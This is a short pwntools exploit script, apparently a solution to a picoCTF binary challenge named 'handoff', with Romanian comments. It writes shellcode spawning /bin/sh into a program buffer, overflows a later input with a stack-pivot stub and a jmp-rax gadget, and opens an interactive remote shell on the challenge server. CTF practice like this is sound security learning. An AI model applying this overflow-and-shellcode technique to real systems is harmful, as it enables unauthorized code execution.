from pwn import *
elf = ELF('/home/kali/Downloads/handoff')
p=elf.process()
p=remote('shape-facility.picoctf.net', 52992)

context.arch = 'amd64'
jmp_rax = p64(0x40116c)
#ne trebuie un jmp rax


shell=asm(shellcraft.sh())


payload1 = asm('nop;nop;sub rsp,670;jmp rsp;')

payload = payload1.ljust(20,b'\x90')
payload += jmp_rax

#`12 bytes pana la rbp apoi avem 8 bytes pt rbp apoi urmeaza rip,
#primele tr sa fie nop-uri cred ca era \0x29 ?

#gdb.attach(p, gdbscript='b *0x4013ED')

p.recvuntil(b'app\n')
p.sendline(b'1')
p.recvline()
p.sendline(b'a'*16)

p.recvuntil(b'app\n')
p.sendline(b'1')
p.recvline()
p.sendline(b'a'*12)

p.recvuntil(b'app\n')
p.sendline(b'2')
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(2*b'\x90'+shell)
#p.sendline(b'c'*16 )

p.recvuntil(b'app\n')
p.sendline(b'3')
p.recvuntil(b'it: \n')
p.sendline(payload)


p.interactive()
